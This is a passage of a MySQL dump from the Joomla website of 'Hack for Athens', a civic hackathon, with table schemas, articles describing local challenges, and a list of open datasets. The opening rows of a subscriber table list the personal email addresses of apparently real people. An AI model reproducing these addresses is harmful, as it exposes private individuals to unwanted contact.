01:58:44\"}'),(14,NULL,'1e4599e8a6',0,NULL,NULL,'jcmanous@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"jcmanous@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(15,NULL,'1e4599e8a6',0,NULL,NULL,'jamesjflannery@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"jamesjflannery@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(16,NULL,'1e4599e8a6',0,NULL,NULL,'agnewell@uga.edu','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"agnewell@uga.edu\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(17,NULL,'1e4599e8a6',0,NULL,NULL,'athensinnovations@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"athensinnovations@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(18,NULL,'1e4599e8a6',0,NULL,NULL,'baron@venturecranial.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"baron@venturecranial.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(19,NULL,'1e4599e8a6',0,NULL,NULL,'charles@geographic.info','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"charles@geographic.info\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(20,NULL,'1e4599e8a6',0,NULL,NULL,'dana@danavalerie.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"dana@danavalerie.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(21,NULL,'1e4599e8a6',0,NULL,NULL,'eric@ericwagoner.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"eric@ericwagoner.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(22,NULL,'1e4599e8a6',0,NULL,NULL,'ghdaustraliasaless@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"ghdaustraliasaless@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(23,NULL,'1e4599e8a6',0,NULL,NULL,'happy@mcplaksin.org','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"happy@mcplaksin.org\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(24,NULL,'1e4599e8a6',0,NULL,NULL,'hrthrghegeg@outlook.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"hrthrghegeg@outlook.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(25,NULL,'1e4599e8a6',0,NULL,NULL,'iamtommymcdonald@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"iamtommymcdonald@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(26,NULL,'1e4599e8a6',0,NULL,NULL,'jacob@rentpost.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"jacob@rentpost.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(27,NULL,'1e4599e8a6',0,NULL,NULL,'n.coltrain@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"n.coltrain@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}');
/*!40000 ALTER TABLE `hfa_cmc_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_contact_details`
--

DROP TABLE IF EXISTS `hfa_contact_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_contact_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `con_position` varchar(255) DEFAULT NULL,
  `address` text,
  `suburb` varchar(100) DEFAULT NULL,
  `state` varchar(100) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `postcode` varchar(100) DEFAULT NULL,
  `telephone` varchar(255) DEFAULT NULL,
  `fax` varchar(255) DEFAULT NULL,
  `misc` mediumtext,
  `image` varchar(255) DEFAULT NULL,
  `email_to` varchar(255) DEFAULT NULL,
  `default_con` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `catid` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `mobile` varchar(255) NOT NULL DEFAULT '',
  `webpage` varchar(255) NOT NULL DEFAULT '',
  `sortname1` varchar(255) NOT NULL,
  `sortname2` varchar(255) NOT NULL,
  `sortname3` varchar(255) NOT NULL,
  `language` char(7) NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_contact_details`
--

LOCK TABLES `hfa_contact_details` WRITE;
/*!40000 ALTER TABLE `hfa_contact_details` DISABLE KEYS */;
INSERT INTO `hfa_contact_details` VALUES (1,'Support','support','','','','','','','','','','','your@email.com',0,1,0,'0000-00-00 00:00:00',1,'{\"show_contact_category\":\"\",\"show_contact_list\":\"\",\"presentation_style\":\"\",\"show_tags\":\"\",\"show_name\":\"\",\"show_position\":\"\",\"show_email\":\"\",\"show_street_address\":\"\",\"show_suburb\":\"\",\"show_state\":\"\",\"show_postcode\":\"\",\"show_country\":\"\",\"show_telephone\":\"\",\"show_mobile\":\"\",\"show_fax\":\"\",\"show_webpage\":\"\",\"show_misc\":\"\",\"show_image\":\"\",\"allow_vcard\":\"\",\"show_articles\":\"\",\"show_profile\":\"\",\"show_links\":\"\",\"linka_name\":\"\",\"linka\":false,\"linkb_name\":\"\",\"linkb\":false,\"linkc_name\":\"\",\"linkc\":false,\"linkd_name\":\"\",\"linkd\":false,\"linke_name\":\"\",\"linke\":\"\",\"contact_layout\":\"\",\"show_email_form\":\"\",\"show_email_copy\":\"\",\"banned_email\":\"\",\"banned_subject\":\"\",\"banned_text\":\"\",\"validate_session\":\"\",\"custom_reply\":\"\",\"redirect\":\"\"}',254,4,1,'','','','','','*','2013-04-04 02:14:05',254,'','2014-04-30 21:27:18',254,'','','{\"robots\":\"\",\"rights\":\"\"}',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',3,1);
/*!40000 ALTER TABLE `hfa_contact_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_content`
--

DROP TABLE IF EXISTS `hfa_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_content` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `title` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `introtext` mediumtext NOT NULL,
  `fulltext` mediumtext NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `attribs` varchar(5120) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `language` char(7) NOT NULL COMMENT 'The language code for the article.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB AUTO_INCREMENT=54 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_content`
--

LOCK TABLES `hfa_content` WRITE;
/*!40000 ALTER TABLE `hfa_content` DISABLE KEYS */;
INSERT INTO `hfa_content` VALUES (37,85,'Hack For Athens | 2014','hack-for-athens','<div class=\"gantry-example\">\r\n<!--<a onclick=\"window.open(this.href+\'&amp;img=images/Hack-For-Athens-FLYER.png&amp;title=Hack_For+Athens&amp;width=800&amp;height=800\',\'Hack%20For%20Athens\',\'scrollbars=yes,resizable=yes,location=yes,menubar=yes,status=yes,toolbar=yes,left=\'+(screen.availWidth/2-400)+\',top=\'+(screen.availHeight/2-400)+\',width=800,height=800\');return false;\" href=\"index.php?option=com_jce&amp;view=popup&amp;tmpl=component\"><img style=\"margin: 10px; float: right;\" src=\"images/Hack-For-Athens-FLYER.png\" alt=\"Hack-For-Athens-FLYER\" width=\"200\" height=\"259\" /></a>-->\r\n<p>The National Day of Civic Hacking will provide citizens an opportunity to do what is most quintessentially American: roll up our sleeves, get involved and work together to improve our society.&nbsp;Web and software developers, designers, community organizers, and other folks from all over Athens will gather to tackle local challenges with technology.</p>\r\n<h4><strong>Solving Real Problems, Helping Real People.</strong></h4>\r\n<p>The event will focus on building technical solutions, but it is not about the technology; it’s about addressing local problems and challenges. The goal is to produce workable solutions that improve daily life for real people in our communities. The technical solutions we build will be built for a purpose, not just as an exercise.</p>\r\n<h4><strong>Wondering if you should attend? See the flyer to the right to see if you can help.</strong></h4>\r\n<p>Hack for Athens is one of over 77 events happening nationwide as part of the <a href=\"http://hackforchange.org\" target=\"_blank\">National Day of Civic Hacking</a>. The National Day of Civic Hacking is an event during which citizens from around the country will work together with local, state and federal governments as well as private sector organizations with the common goal of improving their community. Hack for Athens is also licensed under <a href=\"http://rhok.org\" target=\"_blank\">Random Hacks of Kindness</a>, an organization started by Microsoft, Yahoo, and NASA, and the World Bank to run hackathons around the world.</p>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 40px; margin-bottom: -60px;\">\r\n<h2>Event Overview</h2>\r\n</div>','',1,16,'2013-02-18 15:28:38',254,'','2014-04-23 18:54:36',254,0,'0000-00-00 00:00:00','2013-02-18 15:28:38','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":false,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":false,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":false,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"0\",\"link_titles\":\"\",\"show_tags\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',48,1,'','',1,396,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',1,'*',''),(38,91,'Front Page Intro','front-page-intro','<p>-</p>','',1,16,'2013-04-03 23:59:22',254,'','0000-00-00 00:00:00',0,0,'0000-00-00 00:00:00','2013-04-03 23:59:22','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',1,2,'','',1,39,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(39,92,'Sponsorship','sponsorship','<p>-</p>','',1,2,'2013-04-04 01:51:42',254,'','0000-00-00 00:00:00',0,0,'0000-00-00 00:00:00','2013-04-04 01:51:42','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',1,8,'','',1,71,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(40,93,'Challenges','challenges','<p style=\"text-align: center; font-size: 1.8em; line-height: 2em; padding: 0 8em;\">We\'re compiling challenges as we speak, keep checking back in with us, or <a title=\"Submit Your Challenge | Hack For Athens\" href=\"index.php?option=com_b2jcontact&amp;view=b2jcontact&amp;bid=2&amp;Itemid=186\">submit your own challenge</a> for review!</p>\r\n<div class=\"gantry-example\"><a class=\"btn btn-large btn-block btn-primary\" href=\"http://hackforchange.org/2014/index.html#challenges\" target=\"_blank\">View National Challenges Here | National Day of Civic Hacking</a></div>\r\n\r\n<br><br><br>\r\n<span class=\"rt-article-title\"><h2><a href=\"/get-involved/challenges/view-challenges\">Hack For Athens 2013 | Challenges</a></h2></span>\r\n<table class=\"display hackforathens-datatable\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<thead>\r\n<tr><th width=\"300\">Title</th><th>Description</th><th width=\"200\">Contributed By</th></tr>\r\n</thead>\r\n<tbody>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=48:safe-drinking-water-challenge&amp;catid=18:challenges\">Safe Drinking Water Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge requires participants to create documents containing relevant EPA violation information and statistics that can be given directly to each regulating agency responsible.</td>\r\n<td class=\"views-field views-field-field-performer\">Samuel Bronson | <a href=\"http://epa.gov\">EPA</a></td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=49:athens-affordable-internet-challenge&amp;catid=18:challenges\">Athens Affordable Internet Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge will require participants to develop a strategy for providing affordable internet access to low-income neighborhoods within Athens-Clarke county that have low broadband subscription rates.</td>\r\n<td class=\"views-field views-field-field-performer\">Nina Kelly</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=50:athens-alive-challenge&amp;catid=18:challenges\">Athens Alive Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge requires that a visual model for Athens be built that integrates social media into existing information, data, and views.</td>\r\n<td class=\"views-field views-field-field-performer\">Open Block Oakland</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=51:athens-open-data-portal-challenge&amp;catid=18:challenges\">Open Data Portal Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge requires the creation of a system that promotes openness, transparency, and accountability of local government by providing high-value government data in standards compliant, machine readable formats.</td>\r\n<td class=\"views-field views-field-field-performer\">CKAN</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=52:local-banking-benefits-challenge&amp;catid=18:challenges\">Local Banking Benefits Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge requires the creation of an interactive map that conveys that banking locally is not just convenient, but that moving your money to a local bank benefits the community as a whole.</td>\r\n<td class=\"views-field views-field-field-performer\">Becky Sweger</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-title\"><a href=\"index.php?option=com_content&amp;view=article&amp;id=53:athens-openstreetmap-challenge&amp;catid=18:challenges\">Athens OpenStreetMap Challenge</a></td>\r\n<td class=\"views-field views-field-field-description\">This challenge requires the creation of an Athens OpenStreetMap that contains information such as bus routes, bike lanes, etc.</td>\r\n<td class=\"views-field views-field-field-performer\">Jason Woofenden</td>\r\n</tr>\r\n</tbody>\r\n<tfoot>\r\n<tr><th>Title</th><th>Description</th><th>Contributed By</th></tr>\r\n</tfoot>\r\n</table>','',1,2,'2013-04-04 01:54:40',254,'','2014-04-23 18:39:46',254,0,'0000-00-00 00:00:00','2013-04-04 01:54:40','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":false,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":false,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":false,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_tags\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',37,7,'','',1,1163,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(41,94,'Datasets','datasets','<div class=\"gantry-example\"><a class=\"btn btn-large btn-block btn-primary\" href=\"http://hackforchange.org/datasets\" target=\"_blank\">View More Datasets Here | National Day of Civic Hacking</a></div>\r\n<table class=\"display hackforathens-datatable\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<thead>\r\n<tr><th width=\"200\">Resource</th><th>Description</th></tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.epa.gov/enviro/facts/sdwis/model.html\" target=\"_blank\">SDWIS Data Model</a></td>\r\n<td class=\"views-field views-field-field-resource\">Contaminant definitions, health effects, and sources of contamination.</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.epa.gov/enviro/facts/services.html\" target=\"_blank\">Envirofacts API</a></td>\r\n<td class=\"views-field views-field-field-resource\">Envirofacts has developed a RESTful data service API to all of its internal data holdings. This functionality provides a user of Envirofacts with the ability to query any table through the use of a URL.</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.epa.gov/enviro/facts/sdwis/search.html\" target=\"_blank\">SDWIS Geography Search</a></td>\r\n<td class=\"views-field views-field-field-resource\">The Safe Drinking Water Information System (SDWIS) contains information about public water systems and their violations of EPA\'s drinking water regulations, as reported to EPA by the states.</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.census.gov/hhes/www/poverty/index.html\" target=\"_blank\">US Census Poverty Data</a></td>\r\n<td class=\"views-field views-field-field-resource\">The Census Bureau poverty data reports from several major household surveys and programs.</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.census.gov/main/www/access.html\" target=\"_blank\">US Census Data Access Tools</a></td>\r\n<td class=\"views-field views-field-field-resource\">Data access tools, direct file access to census data, and statistics for, using, or about data collected by the US Census Bureau</td>\r\n</tr>\r\n<tr>\r\n<td class=\"views-field views-field-created\"><a href=\"http://investigativereportingworkshop.org/investigations/broadband-adoption/htmlmulti/broadband-adoption-map/\" target=\"_blank\">Broadband Adoption Rates</a></td>\r\n<td class=\"views-field views-field-field-resource\">Demographic data come from the U.S. Census\' 2005-9 American Community Survey; Broadband adoption is based on the 768Kbps download / 200Kbps upload standard used by the Federal Communications Commission</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.internetessentials.com/\" target=\"_blank\">Comcast Internet Essentials</a></td>\r\n<td class=\"views-field views-field-field-resource\">An affordable service offered by a major internet service provider that includes the option to purchase affordable hardware as well</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://opencityapps.org/\" target=\"_blank\">Open City App</a></td>\r\n<td class=\"views-field views-field-field-resource\">Open Source projects created by other civic hacking events and groups</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.data.gov/opendatasites\" target=\"_blank\">Data.gov Sites</a></td>\r\n<td class=\"views-field views-field-field-resource\">Open Data Sites containing a wide variety of data sources to be used within the public sector</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://services.faa.gov/\" target=\"_blank\">FAA Web Services</a></td>\r\n<td class=\"views-field views-field-field-resource\">Federal Aviation Association\'s common framework and documentation for web services</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.opengovtplatform.org/\" target=\"_blank\">Open Government Platform</a></td>\r\n<td class=\"views-field views-field-field-resource\">OGPL is a joint product from India and United States to promote transparency and greater citizen engagement by making more government data, documents, tools and processes publicly available.</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://nationsreportcard.gov/data_tools.aspx\" target=\"_blank\">The Nation\'s Report Card</a></td>\r\n<td class=\"views-field views-field-field-resource\">The National Assessment of Educational Progress (NAEP) is the largest nationally representative and continuing assessment of what America\'s students know and can do in various subject areas.</td>\r\n</tr>\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.bls.gov/news.release/laus.nr0.htm\" target=\"_blank\"> Employment Summary </a></td>\r\n<td class=\"views-field views-field-field-resource\">Regional and State Employment and Unemployment Summary</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www.gallup.com/poll/125066/State-States.aspx\" 